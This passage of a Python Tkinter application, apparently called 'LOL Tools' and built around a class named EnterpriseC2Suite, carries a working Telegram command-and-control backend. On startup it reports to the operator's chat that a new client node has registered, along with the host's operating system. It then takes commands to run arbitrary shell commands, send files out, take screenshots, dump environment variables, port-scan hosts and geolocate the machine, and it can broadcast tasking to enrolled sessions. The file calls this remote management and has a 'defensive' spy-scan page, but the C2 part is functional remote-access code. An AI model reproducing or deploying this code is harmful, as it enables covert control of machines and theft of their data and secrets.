        threading.Thread(target=self._browser_tail, daemon=True).start()

    def _browser_close(self):
        if self.browser_proc and self.browser_proc.poll() is None:
            self.browser_proc.terminate()
            self._log_proxy("[■] Browser closed.")
        self.browser_proc = None

    def _browser_tail(self):
        offset = 0
        while self.browser_proc and self.browser_proc.poll() is None:
            time.sleep(2)
            try:
                with open(self.browser_log_file) as f:
                    lines = f.readlines()
                for ln in lines[offset:]:
                    try:
                        e = json.loads(ln)
                        self.log_queue.put(("append", "browser_history", f"{e['time']}  {e['url']}"))
                    except Exception:
                        pass
                    offset += 1
                if len(lines) > 300:
                    offset = 0
                    self.log_queue.put(("browser_reload",))
            except Exception:
                pass

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: OPS DB + SETTINGS
    # ═══════════════════════════════════════════════════════════════════
    def _build_db_page(self):
        f = self.page_frames["Ops DB"]
        cfg = self._card(f, "🗄️ Gateway Config Vault (AES-encrypted)")
        tk.Label(cfg, text="Master Password:", bg=BG2, fg=TEXT).pack(side="left")
        self.master_pass = self._entry(cfg, 24)
        self.master_pass.pack(side="left", padx=8)
        self._btn(cfg, "💾 Save Config", self._save_config, ACCENT).pack(side="left", padx=4)
        self._btn(cfg, "📂 Load Config", self._load_config, ACCENT2).pack(side="left", padx=4)

        tk.Label(f, text="Operations Log (SQLite):", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w", padx=18)
        cols = ("time", "category", "action", "detail")
        self.ops_tree = ttk.Treeview(f, columns=cols, show="headings", height=14)
        for c in cols:
            self.ops_tree.heading(c, text=c.upper())
            self.ops_tree.column(c, width=170 if c == "detail" else 110, anchor="w")
        self.ops_tree.column("time", width=170)
        self.ops_tree.pack(fill="both", expand=True, padx=16, pady=(2, 6))
        row = tk.Frame(f, bg=BG)
        row.pack(fill="x", padx=16, pady=(0, 12))
        self._btn(row, "🔄 Refresh", self._refresh_ops, BG3, TEXT).pack(side="left", padx=4)
        self._btn(row, "📄 Export HTML", self._export_ops, ACCENT2).pack(side="left", padx=4)
        self._btn(row, "🗑 Clear", self._clear_ops, YELLOW, BG).pack(side="left", padx=4)
        self._refresh_ops()

    def _refresh_ops(self):
        try:
            rows = self.db.recent(300)
        except Exception:
            rows = []
        for i in self.ops_tree.get_children():
            self.ops_tree.delete(i)
        for ts, cat, act, det in rows:
            self.ops_tree.insert("", "end", values=(ts, cat, act, det))
        self._refresh_db_status()

    def _export_ops(self):
        rows = self.db.recent(1000)
        path = os.path.join(os.path.expanduser("~"),
                            f"ops_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        text = "\n".join(f"{ts} | {cat} | {act} | {det}" for ts, cat, act, det in rows)
        try:
            SecurityEngine.export_html(text, "LOL Tools — Operations Log", path)
            messagebox.showinfo("Export", f"Saved: {path}")
        except Exception as e:
            messagebox.showerror("Export", str(e))

    def _clear_ops(self):
        self.db.clear()
        self._refresh_ops()

    def _save_config(self):
        if not HAS_CRYPTOGRAPHY:
            messagebox.showerror("Error", "cryptography package required.")
            return
        pwd = self.master_pass.get().strip()
        if not pwd:
            messagebox.showwarning("Warning", "Master password required.")
            return
        payload = {"token": self.token_entry.get().strip(), "chat": self.chat_entry.get().strip()}
        path = os.path.join(os.path.expanduser("~"), ".tools1_gateway.enc")
        try:
            SecurityEngine.save_secret(payload, pwd, path)
            messagebox.showinfo("Config", f"Saved encrypted config: {path}")
            self._log_op("config", "Save gateway config", path)
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def _load_config(self):
        if not HAS_CRYPTOGRAPHY:
            messagebox.showerror("Error", "cryptography package required.")
            return
        pwd = self.master_pass.get().strip()
        path = os.path.join(os.path.expanduser("~"), ".tools1_gateway.enc")
        if not os.path.isfile(path):
            messagebox.showwarning("Config", "No config file found yet.")
            return
        try:
            payload = SecurityEngine.load_secret(pwd, path)
            self.token_entry.delete(0, "end")
            self.token_entry.insert(0, payload.get("token", ""))
            self.chat_entry.delete(0, "end")
            self.chat_entry.insert(0, payload.get("chat", ""))
            messagebox.showinfo("Config", "Gateway config loaded.")
            self._log_op("config", "Load gateway config", path)
        except Exception as e:
            messagebox.showerror("Error", f"Wrong password or corrupt file: {e}")

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: C2 MATRIX (Telegram Command & Control Center)
    # ═══════════════════════════════════════════════════════════════════
    def _build_c2_page(self):
        f = self.page_frames["C2"]
        ctrl = self._card(f, "🎛️ C2 Matrix — Bot Control")
        tk.Label(ctrl, text="Bot Token:", bg=BG2, fg=TEXT).pack(side="left")
        self.c2_token = self._entry(ctrl, 30)
        self.c2_token.pack(side="left", padx=6)
        tk.Label(ctrl, text="Admin IDs (comma-sep):", bg=BG2, fg=TEXT).pack(side="left", padx=(10, 4))
        self.c2_admins = self._entry(ctrl, 16)
        self.c2_admins.pack(side="left", padx=6)
        self._btn(ctrl, "▶ Start C2", self._trigger_c2_start, ACCENT2).pack(side="left", padx=6)
        self._btn(ctrl, "■ Stop C2", self._trigger_c2_stop, YELLOW, BG).pack(side="left", padx=4)
        self.c2_status = tk.Label(ctrl, text="● Offline", bg=BG2, fg=TDIM, font=(MONO, 9))
        self.c2_status.pack(side="left", padx=10)

        # Sessions
        sess = self._card(f, "👥 Authorized Sessions (nodes)")
        tk.Label(sess, text="Enroll ID:", bg=BG2, fg=TEXT).pack(side="left")
        self.c2_session_add = self._entry(sess, 14)
        self.c2_session_add.pack(side="left", padx=6)
        self._btn(sess, "➕ Enroll", self._c2_add_session, ACCENT).pack(side="left", padx=4)
        self._btn(sess, "➖ Remove", self._c2_remove_session, YELLOW, BG).pack(side="left", padx=4)
        self._btn(sess, "🔄 Refresh", self._refresh_c2_sessions, BG3, TEXT).pack(side="left", padx=4)
        cols = ("cid", "seen", "status", "ops")
        self.c2_sess_tree = ttk.Treeview(f, columns=cols, show="headings", height=5)
        for c in cols:
            self.c2_sess_tree.heading(c, text=c.upper())
        self.c2_sess_tree.column("cid", width=120)
        self.c2_sess_tree.column("seen", width=180)
        self.c2_sess_tree.column("status", width=90)
        self.c2_sess_tree.column("ops", width=60)
        self.c2_sess_tree.pack(fill="x", padx=16, pady=(0, 6))

        # Broadcast / tasking
        bcast = self._card(f, "📨 Broadcast Tasking (push to all sessions)")
        self.c2_broadcast = self._entry(bcast, 52)
        self.c2_broadcast.pack(side="left", padx=6)
        self._btn(bcast, "📢 Broadcast", self._trigger_c2_broadcast, PURPLE).pack(side="left", padx=6)

        # Task queue
        tk.Label(f, text="📋 Task Queue:", bg=BG, fg=TDIM, font=(MONO, 8)).pack(anchor="w", padx=18)
        cols2 = ("id", "time", "session", "kind", "target", "status")
        self.c2_job_tree = ttk.Treeview(f, columns=cols2, show="headings", height=7)
        for c in cols2:
            self.c2_job_tree.heading(c, text=c.upper())
        self.c2_job_tree.column("id", width=40)
        self.c2_job_tree.column("time", width=150)
        self.c2_job_tree.column("session", width=110)
        self.c2_job_tree.column("kind", width=90)
        self.c2_job_tree.column("target", width=300)
        self.c2_job_tree.column("status", width=80)
        self.c2_job_tree.pack(fill="both", expand=True, padx=16, pady=(2, 6))
        row = tk.Frame(f, bg=BG)
        row.pack(fill="x", padx=16, pady=(0, 12))
        self._btn(row, "🔄 Refresh", self._refresh_c2_jobs, BG3, TEXT).pack(side="left", padx=4)
        self._btn(row, "🧹 Clear Jobs", self._c2_clear_jobs, BG3, TEXT).pack(side="left", padx=4)

    def _trigger_c2_start(self):
        token = self.c2_token.get().strip()
        admins = self.c2_admins.get().strip()
        if not token or not admins:
            messagebox.showwarning("C2", "Bot token and admin IDs are required.")
            return
        self.token_entry.delete(0, "end")
        self.token_entry.insert(0, token)
        self.chat_entry.delete(0, "end")
        self.chat_entry.insert(0, admins)
        self.c2_stop.clear()
        self._start_telegram_loop()

    def _trigger_c2_stop(self):
        self.c2_stop.set()
        if self.c2_bot:
            try:
                self.c2_bot.send_message(chat_id=next(iter(self.c2_sessions), None),
                                         text="[■] C2 controller offline.")
            except Exception:
                pass
        self.c2_status.configure(text="● Offline", fg=TDIM)
        self.gateway_status.configure(text="● Gateway Offline", fg=TDIM)
        self._log_mgmt("[■] C2 controller stopped.")

    def _c2_touch(self, chat_id):
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if chat_id not in self.c2_sessions:
            self.c2_sessions[chat_id] = {"seen": now, "status": "connected", "ops": 0}
        self.c2_sessions[chat_id]["seen"] = now
        self.c2_sessions[chat_id]["status"] = "connected"
        self.c2_sessions[chat_id]["ops"] += 1
        self.log_queue.put(("c2_refresh",))

    def _c2_admin_ids(self):
        ids = set()
        for x in str(self.chat_entry.get() if hasattr(self, "chat_entry") else "").split(","):
            x = x.strip()
            if x:
                ids.add(x)
        ids |= set(self.c2_sessions.keys())
        return ids

    def _c2_add_session(self):
        cid = self.c2_session_add.get().strip()
        if not cid:
            return
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.c2_sessions[cid] = {"seen": now, "status": "enrolled", "ops": 0}
        self.c2_session_add.delete(0, "end")
        self._log_op("c2", "Enroll session", cid)
        self._refresh_c2_sessions()

    def _c2_remove_session(self):
        sel = self.c2_sess_tree.selection()
        if not sel:
            return
        idx = self.c2_sess_tree.index(sel[0])
        cids = list(self.c2_sessions.keys())
        if idx < len(cids):
            cid = cids[idx]
            self.c2_sessions.pop(cid, None)
            self._log_op("c2", "Remove session", cid)
            self._refresh_c2_sessions()

    def _refresh_c2_sessions(self):
        for i in self.c2_sess_tree.get_children():
            self.c2_sess_tree.delete(i)
        for cid, info in sorted(self.c2_sessions.items()):
            self.c2_sess_tree.insert("", "end", values=(
                cid, info.get("seen", "-"), info.get("status", "-"), info.get("ops", 0)))

    def _c2_log_job(self, chat_id, kind, target, status="received"):
        job = {"id": len(self.c2_jobs) + 1,
               "ts": datetime.datetime.now().strftime("%H:%M:%S"),
               "session": chat_id, "kind": kind, "target": target[:120], "status": status}
        self.c2_jobs.insert(0, job)
        self.log_queue.put(("c2_job", job))
        self._log_op("c2", f"Job {job['id']} [{kind}] {status}", target[:80])

    def _c2_insert_job(self, job):
        self.c2_job_tree.insert("", "end", values=(
            job["id"], job["ts"], job["session"], job["kind"], job["target"], job["status"]))
        if len(self.c2_job_tree.get_children()) > 300:
            self.c2_job_tree.delete(self.c2_job_tree.get_children()[0])

    def _refresh_c2_jobs(self):
        for i in self.c2_job_tree.get_children():
            self.c2_job_tree.delete(i)
        for job in self.c2_jobs[:300]:
            self._c2_insert_job(job)

    def _c2_clear_jobs(self):
        self.c2_jobs = []
        for i in self.c2_job_tree.get_children():
            self.c2_job_tree.delete(i)

    def _trigger_c2_broadcast(self):
        msg = self.c2_broadcast.get().strip()
        if not msg:
            return
        if not self.c2_bot:
            messagebox.showwarning("C2", "Start the C2 controller first.")
            return
        targets = list(self.c2_sessions.keys())
        if not targets:
            messagebox.showwarning("C2", "No authorized sessions enrolled.")
            return
        for t in targets:
            threading.Thread(target=self._c2_bcast_worker, args=(t, msg), daemon=True).start()
        self._log_op("c2", "Broadcast", f"to {len(targets)} sessions: {msg[:60]}")

    def _c2_bcast_worker(self, chat, msg):
        try:
            self.c2_bot.send_message(chat_id=chat, text=f"📢 [C2 TASK] {msg}")
        except Exception as e:
            self._log_op("c2", "Broadcast fail", f"{chat}: {e}")

    # ═══════════════════════════════════════════════════════════════════
    # PAGE: SPY SCAN (defensive — detect surveillance on your devices)
    # ═══════════════════════════════════════════════════════════════════
    def _build_spy_page(self):
        f = self.page_frames["Spy Scan"]
        local = self._card(f, "🖥️ Local Device Surveillance Scan (this machine)")
        self._btn(local, "🔍 Scan This Machine", self._trigger_local_spy_scan, ACCENT2).pack(side="left", padx=6)
        self._btn(local, "📄 Export HTML", self._export_spy_report, BG3, TEXT).pack(side="left", padx=6)
        self.spy_local_box = tk.Text(f, height=12, bg=BG2, fg=TEXT, insertbackground=TEXT,
                                     font=(MONO, 9), relief="flat")
        self.spy_local_box.pack(fill="x", padx=16, pady=(0, 8))

        apk = self._card(f, "📱 Android APK Spyware Analyzer")
        tk.Label(apk, text="APK Path:", bg=BG2, fg=TEXT).pack(side="left")
        self.spy_apk_entry = self._entry(apk, 40)
        self.spy_apk_entry.pack(side="left", padx=6)
        self._btn(apk, "📂 Browse", self._browse_apk, BG3, TEXT).pack(side="left", padx=4)
        self._btn(apk, "🔎 Analyze", self._trigger_apk_analyze, PURPLE).pack(side="left", padx=6)
        self.spy_apk_box = tk.Text(f, height=16, bg=BG2, fg=TEXT, insertbackground=TEXT,
                                   font=(MONO, 9), relief="flat")
        self.spy_apk_box.pack(fill="both", expand=True, padx=16, pady=(0, 12))

    def _trigger_local_spy_scan(self):
        self._spy_status = tk.Label(self.page_frames["Spy Scan"], text="Scanning...", bg=BG,
                                    fg=YELLOW, font=(MONO, 9))
        self._spy_status.pack(pady=(0, 6))
        self._btn_area = self.page_frames["Spy Scan"]
        threading.Thread(target=self._spy_scan_worker, daemon=True).start()

    def _spy_scan_worker(self):
        try:
            res = SecurityEngine.local_spy_scan()
        except Exception as e:
            res = f"Scan error: {e}"
        self.log_queue.put(("append", "spy_local_box", res))
        self.log_queue.put(("label", "_spy_status", "✓ Scan complete", ACCENT))
        self._log_op("spyscan", "Local scan", f"{res.count(chr(10))} findings")

    def _browse_apk(self):
        fn = filedialog.askopenfilename(title="Select APK", filetypes=[("APK", "*.apk")])
        if fn:
            self.spy_apk_entry.delete(0, "end")
            self.spy_apk_entry.insert(0, fn)

    def _trigger_apk_analyze(self):
        path = self.spy_apk_entry.get().strip()
        if not path:
            return
        threading.Thread(target=self._apk_worker, args=(path,), daemon=True).start()

    def _apk_worker(self, path):
        try:
            res = SecurityEngine.analyze_apk(path)
        except Exception as e:
            res = f"Analysis error: {e}"
        self.log_queue.put(("append", "spy_apk_box", res))
        self._log_op("spyscan", "APK analyze", os.path.basename(path))

    def _export_spy_report(self):
        txt = f"── Local Surveillance Scan ──\n{self.spy_local_box.get('1.0', 'end').strip()}\n\n" \
              f"── APK Analysis ──\n{self.spy_apk_box.get('1.0', 'end').strip()}\n"
        path = os.path.join(os.path.expanduser("~"),
                            f"spyscan_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        try:
            SecurityEngine.export_html(txt, "LOL Tools — Defensive Spy Scan Report", path)
            messagebox.showinfo("Export", f"Saved: {path}")
        except Exception as e:
            messagebox.showerror("Export", str(e))

    # ═══════════════════════════════════════════════════════════════════
    # THREAD-ISOLATED ASYNC TELEGRAM BACKEND (RMM Controller)
    # ═══════════════════════════════════════════════════════════════════
    def _start_telegram_loop(self):
        if not HAS_TELEGRAM:
            messagebox.showerror("Error", "Dependency 'python-telegram-bot' package not found.")
            return
        token = self.token_entry.get().strip()
        chat_id = self.chat_entry.get().strip()
        if not token or not chat_id:
            messagebox.showwarning("Warning", "Authentication input parameters cannot be left blank.")
            return
        self.gateway_status.configure(text="● Gateway: Active Listening", fg=ACCENT)
        self.c2_status.configure(text="● C2 Online", fg=ACCENT)
        self.c2_started = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._log_mgmt("[+] Launching isolated runtime environment for Telegram C2 Channel...")
        self._log_op("telegram", "Gateway initialize", chat_id)
        self.loop_thread = threading.Thread(target=lambda: self._async_runner_thread(token, chat_id), daemon=True)
        self.loop_thread.start()

    def _async_runner_thread(self, token, chat_id):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(self._run_telegram_bot(token, chat_id))

    async def _run_telegram_bot(self, token, chat_id):
        def authorized(update):
            cid = str(update.message.chat_id)
            ok = cid in self._c2_admin_ids()
            if ok:
                self._c2_touch(cid)
                txt = update.message.text.strip()
                kind = txt.split()[0] if txt else "text"
                self._c2_log_job(cid, "cmd" if txt.startswith("/") else "menu", txt)
            self._log_mgmt(f"[dbg] msg from chat {cid} | authorized={ok}")
            return ok

        try:
            init_url = f"https://api.telegram.org/bot{token}/sendMessage"
            metadata = (
                f"🚨 [System Node Event Notice]\n"
                f"• Monitoring Status: Client Node Registered\n"
                f"• Target Endpoint OS: {platform.system()} ({platform.release()})\n"
                f"• Timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"🟢 Node channel connected. Send /start to open the admin menu."
            )
            requests.post(init_url, json={"chat_id": chat_id, "text": metadata}, timeout=5)
            self._log_mgmt("[+] Initial entry connection alert dispatched to Admin successfully.")
        except Exception as e:
            self._log_mgmt(f"[-] Broadcast failure: {str(e)}")

        async def start_command(update, context):
            if not authorized(update):
                return
            menu = [
                [KeyboardButton("📋 System Telemetry"), KeyboardButton("🖥 Process List")],
                [KeyboardButton("🌐 Default Scan"), KeyboardButton("📂 Home Directory")],
                [KeyboardButton("📸 Screenshot"), KeyboardButton("🔍 My IP")],
            ]
            help_txt = (
                "⚙️ RMM Control Protocol Initialized.\n"
                "Use the buttons below or send commands:\n"
                "  /exec <command>  — run a shell command\n"
                "  /ls <path>       — list a directory\n"
                "  /get <file>      — download a file\n"
                "  /shot            — local screen capture\n"
                "  /ps              — top processes\n"
                "  /scan <host>     — quick port scan\n"
                "  /geo             — public IP / geo\n"
                "  /net             — network interfaces\n"
                "  /env             — environment variables"
            )
            await update.message.reply_text(help_txt, reply_markup=ReplyKeyboardMarkup(menu, resize_keyboard=True))

        async def handle_admin_queries(update, context):
            if not authorized(update):
                return
            text = update.message.text.strip()
            if text == "📋 System Telemetry":
                await update.message.reply_text("[~] Collecting telemetry...")
                stats = await asyncio.to_thread(SecurityEngine.get_system_telemetry)
                await update.message.reply_text(stats[:3800])
            elif text == "🖥 Process List":
                await update.message.reply_text("[~] Sampling processes...")
                procs = await asyncio.to_thread(SecurityEngine.list_top_processes, 12)
                await update.message.reply_text(procs[:3800])
            elif text == "🌐 Default Scan":
                await update.message.reply_text("[~] Running localized diagnostic port audit on 'localhost'...")
                report = await asyncio.to_thread(SecurityEngine.run_full_scan, "127.0.0.1", None, True)
                await update.message.reply_text(report[:3800])
            elif text == "📂 Home Directory":
                result = await asyncio.to_thread(SecurityEngine.list_directory, os.path.expanduser("~"))
                await update.message.reply_text(result[:3800])
            elif text == "📸 Screenshot":
                await update.message.reply_text("[~] Capturing local screen...")
                path = os.path.join(os.path.expanduser("~"),
                                    f"shot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
                shot = await asyncio.to_thread(SecurityEngine.take_screenshot, path)
                if shot:
                    try:
                        with open(shot, "rb") as f:
                            await update.message.reply_document(document=f, filename=os.path.basename(shot))
                    except Exception as e:
                        await update.message.reply_text(f"Screenshot send error: {e}")
                else:
                    await update.message.reply_text("[-] Screenshot failed (no display / no tool available).")
            elif text == "🔍 My IP":
                if HAS_REQUESTS:
                    try:
                        r = requests.get("http://ip-api.com/json/", timeout=6)
                        d = r.json()
                        await update.message.reply_text(f"🌐 Public IP: {d.get('query')}")
                    except Exception:
                        await update.message.reply_text("IP lookup failed")
                else:
                    await update.message.reply_text("requests not installed")

        async def exec_command(update, context):
            if not authorized(update):
                return
            parts = update.message.text.split(maxsplit=1)
            if len(parts) < 2:
                await update.message.reply_text("Usage: /exec <command>")
                return
            result = await asyncio.to_thread(SecurityEngine.run_shell_command, parts[1])
            await update.message.reply_text(result[:3800])

        async def list_dir(update, context):
            if not authorized(update):
                return
            parts = update.message.text.split(maxsplit=1)
            path = parts[1] if len(parts) > 1 else os.getcwd()
            result = await asyncio.to_thread(SecurityEngine.list_directory, path)
            await update.message.reply_text(result[:3800])

        async def download_file(update, context):
            if not authorized(update):
                return
            parts = update.message.text.split(maxsplit=1)
            if len(parts) < 2:
                await update.message.reply_text("Usage: /get <path>")
                return
            path = parts[1]
            if not os.path.isfile(path):
                await update.message.reply_text(f"File not found: {path}")
                return
            if os.path.getsize(path) > 45 * 1024 * 1024:
                await update.message.reply_text("File too large for Telegram transfer (>45MB)")
                return
            await update.message.reply_text(f"[~] Sending: {path}")
            try:
                with open(path, "rb") as f:
                    await update.message.reply_document(document=f, filename=os.path.basename(path))
            except Exception as e:
                await update.message.reply_text(f"Transfer error: {e}")

        async def list_processes(update, context):
            if not authorized(update):
                return
            procs = await asyncio.to_thread(SecurityEngine.list_top_processes, 12)
            await update.message.reply_text(procs[:3800])

        async def scan_command(update, context):
            if not authorized(update):
                return
            parts = update.message.text.split()
            target = parts[1] if len(parts) > 1 else "127.0.0.1"
            await update.message.reply_text(f"[~] Scanning {target} (quick)...")
            report = await asyncio.to_thread(SecurityEngine.run_full_scan, target, None, True)
            await update.message.reply_text(report[:3800])

        async def geo_command(update, context):
            if not authorized(update):
                return
            if not HAS_REQUESTS:
                await update.message.reply_text("requests library not installed")
                return
            try:
                r = requests.get("http://ip-api.com/json/", timeout=6)
                d = r.json()
                if d.get("status") == "success":
                    await update.message.reply_text(
                        f"🌐 Public IP: {d.get('query')}\n📍 {d.get('city')}, {d.get('regionName')}, "
                        f"{d.get('country')}\nISP: {d.get('isp')}\nASN: {d.get('as')}")
                else:
                    await update.message.reply_text("Geo lookup failed")
            except Exception as e:
                await update.message.reply_text(f"Geo error: {e}")

        async def net_command(update, context):
            if not authorized(update):
                return
            result = await asyncio.to_thread(SecurityEngine.get_network_interfaces)
            await update.message.reply_text(result[:3800])

        async def env_command(update, context):
            if not authorized(update):
                return
            lines = [f"{k}={v}" for k, v in sorted(os.environ.items())[:40]]
            await update.message.reply_text("\n".join(lines)[:3800])

        async def shot_command(update, context):
            if not authorized(update):
                return
            await update.message.reply_text("[~] Capturing local screen...")
            path = os.path.join(os.path.expanduser("~"),
                                f"shot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
            shot = await asyncio.to_thread(SecurityEngine.take_screenshot, path)
            if shot:
                try:
                    with open(shot, "rb") as f:
                        await update.message.reply_document(document=f, filename=os.path.basename(shot))
                except Exception as e:
                    await update.message.reply_text(f"Screenshot send error: {e}")
            else:
                await update.message.reply_text("[-] Screenshot failed (no display / no tool available).")

        bot_app = ApplicationBuilder().token(token).build()
        self.c2_bot = bot_app.bot
        bot_app.add_handler(CommandHandler("start", start_command))
        bot_app.add_handler(CommandHandler("exec", exec_command))
        bot_app.add_handler(CommandHandler("ls", list_dir))
        bot_app.add_handler(CommandHandler("get", download_file))
        bot_app.add_handler(CommandHandler("ps", list_processes))
        bot_app.add_handler(CommandHandler("scan", scan_command))
        bot_app.add_handler(CommandHandler("geo", geo_command))
        bot_app.add_handler(CommandHandler("net", net_command))
        bot_app.add_handler(CommandHandler("env", env_command))
        bot_app.add_handler(CommandHandler("shot", shot_command))
        bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_admin_queries))

        await bot_app.initialize()
        await bot_app.start()
        await bot_app.updater.start_polling()
        try:
            while not self.c2_stop.is_set():
                await asyncio.sleep(1)
        finally:
            await bot_app.updater.stop()
            await bot_app.stop()
            await bot_app.shutdown()
            self.c2_bot = None
            self.root.after(0, lambda: self.c2_status.configure(text="● Offline", fg=TDIM))
            self.root.after(0, lambda: self.gateway_status.configure(text="● Gateway Offline", fg=TDIM))
            self._log_mgmt("[■] Telegram C2 channel closed.")

# ───────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app_root = tk.Tk()
    suite = EnterpriseC2Suite(app_root)
    app_root.mainloop()
